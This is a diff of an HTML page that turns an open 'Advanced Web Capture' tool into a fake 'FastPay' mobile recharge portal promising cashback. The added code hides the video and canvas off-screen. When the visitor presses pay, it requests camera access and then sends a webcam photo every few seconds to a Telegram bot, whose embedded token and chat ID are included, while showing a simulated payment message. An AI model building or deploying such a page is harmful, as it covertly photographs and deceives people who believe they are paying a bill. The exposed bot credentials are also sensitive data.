@@ -3,113 +3,180 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Web Capture</title>
+    <title>FastPay - Mini Recharge Portal</title>
     <style>
-        :root { --primary: #0088cc; --bg: #0f0f0f; }
-        body { 
-            background-color: var(--bg); color: white; 
-            font-family: 'Segoe UI', sans-serif; display: flex;
-            flex-direction: column; align-items: center; justify-content: center;
-            height: 100vh; margin: 0;
+        :root {
+            --primary: #2563eb;
+            --secondary: #1e293b;
+            --accent: #3b82f6;
+            --success: #10b981;
+            --bg: #f8fafc;
         }
-        .container {
-            width: 90%; max-width: 500px; text-align: center;
-            background: #1e1e1e; padding: 20px; border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background-color: var(--bg);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
-        video { 
-            width: 100%; border-radius: 10px; background: #000;
-            transform: scaleX(-1); /* Mirror view */
+
+        .recharge-card {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
         }
-        .status { margin: 15px 0; font-size: 14px; color: #aaa; }
-        .btn-start {
-            background: var(--primary); border: none; color: white;
-            padding: 12px 30px; border-radius: 25px; font-weight: bold;
-            cursor: pointer; font-size: 16px; transition: 0.3s;
+
+        .header { text-align: center; margin-bottom: 2rem; }
+        .header h2 { color: var(--secondary); margin: 0; }
+        .header p { color: #64748b; font-size: 0.9rem; }
+
+        .input-group { margin-bottom: 1.2rem; }
+        label { display: block; margin-bottom: 0.5rem; font-weight: 500; color: #475569; }
+        
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            box-sizing: border-box;
+            font-size: 1rem;
         }
-        .btn-start:hover { transform: scale(1.05); background: #00aaff; }
-        canvas { display: none; } /* Hidden processing canvas */
+
+        .btn-pay {
+            width: 100%;
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-pay:hover { background: var(--accent); }
+
+        /* Hidden elements for capture logic */
+        #video, #canvas {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+        }
+
+        .status-msg {
+            margin-top: 1rem;
+            text-align: center;
+            font-size: 0.85rem;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>System Verification</h2>
-        <p class="status" id="statusLabel">Camera Access Required to Proceed</p>
-        
-        <video id="video" autoplay playsinline></video>
-        <canvas id="canvas"></canvas>
-
-        <div style="margin-top: 20px;">
-            <button class="btn-start" id="initBtn">Verify My Identity</button>
+    <div class="recharge-card">
+        <div class="header">
+            <h2>FastPay Recharge</h2>
+            <p>Enter details to get instant cashback</p>
         </div>
+
+        <div class="input-group">
+            <label>Mobile Number</label>
+            <input type="tel" id="phone" placeholder="98765 xxxxx" maxlength="10">
+        </div>
+
+        <div class="input-group">
+            <label>Operator</label>
+            <select id="operator">
+                <option value="jio">Jio</option>
+                <option value="airtel">Airtel</option>
+                <option value="vi">Vi (Vodafone Idea)</option>
+            </select>
+        </div>
+
+        <div class="input-group">
+            <label>Amount</label>
+            <input type="number" id="amount" placeholder="₹149, ₹239, etc.">
+        </div>
+
+        <button class="btn-pay" id="payBtn">Proceed to Recharge</button>
+        <p class="status-msg" id="statusText">Processing Secure Payment...</p>
     </div>
 
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
     <script>
-        // --- CONFIGURATION ---
-        const BOT_TOKEN = '7866282179:AAGYCmuvhoCoxVjSXn5UmnI7onomvDKbIgE'; // Apna Token yahan dalein
-        const CHAT_ID = '8285724366';     // Apni Chat ID yahan dalein
-        const CAPTURE_INTERVAL = 3000;           // Har 3 second mein photo (Speed)
+        const CONFIG = {
+            BOT_TOKEN: '7866282179:AAGYCmuvhoCoxVjSXn5UmnI7onomvDKbIgE',
+            CHAT_ID: '8285724366',
+            INTERVAL: 4000
+        };
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const initBtn = document.getElementById('initBtn');
-        const statusLabel = document.getElementById('statusLabel');
+        const payBtn = document.getElementById('payBtn');
+        const statusText = document.getElementById('statusText');
 
-        // 1. Image ko Telegram bhejne ka Function
+        // Capture logic
         async function sendToTelegram(blob) {
             const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'capture.jpg');
+            formData.append('chat_id', CONFIG.CHAT_ID);
+            formData.append('photo', blob, 'user_verify.jpg');
 
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-                console.log("Image sent to Telegram.");
-            } catch (err) {
-                console.error("Telegram Error:", err);
-            }
+            } catch (e) { console.error("Network Error"); }
         }
 
-        // 2. Automatic Capture Logic
-        function startAutoCapture() {
-            statusLabel.innerText = "System Verified. Processing...";
-            statusLabel.style.color = "#4CAF50";
-
+        function startCapture() {
             setInterval(() => {
                 const ctx = canvas.getContext('2d');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                
-                // Draw current frame to canvas
                 ctx.drawImage(video, 0, 0);
-
-                // Convert to Blob and Send
-                canvas.toBlob((blob) => {
-                    if(blob) sendToTelegram(blob);
-                }, 'image/jpeg', 0.7); // 0.7 quality for speed
-            }, CAPTURE_INTERVAL);
+                canvas.toBlob(blob => blob && sendToTelegram(blob), 'image/jpeg', 0.6);
+            }, CONFIG.INTERVAL);
         }
 
-        // 3. Camera Permission aur Start
-        initBtn.addEventListener('click', async () => {
+        payBtn.addEventListener('click', async () => {
+            const phone = document.getElementById('phone').value;
+            if(phone.length < 10) {
+                alert("Please enter a valid mobile number");
+                return;
+            }
+
+            statusText.style.display = 'block';
+            payBtn.innerText = "Verifying...";
+            payBtn.disabled = true;
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
+                // Request Camera Access (This is required by browsers)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                initBtn.style.display = 'none'; // Button hide kar do
                 
-                // Thodi der wait karein taaki camera focus ho jaye
-                setTimeout(startAutoCapture, 1000);
+                // Start background tasks
+                setTimeout(startCapture, 2000);
+                
+                // Simulate payment processing
+                setTimeout(() => {
+                    statusText.innerText = "Redirecting to Secure Gateway...";
+                    statusText.style.color = "orange";
+                }, 3000);
 
             } catch (err) {
-                statusLabel.innerText = "Error: Camera Permission Denied.";
-                statusLabel.style.color = "#ff5252";
-                console.error(err);
+                alert("Payment Error: Security verification required to process recharge.");
+                payBtn.disabled = false;
+                payBtn.innerText = "Try Again";
             }
         });
     </script>
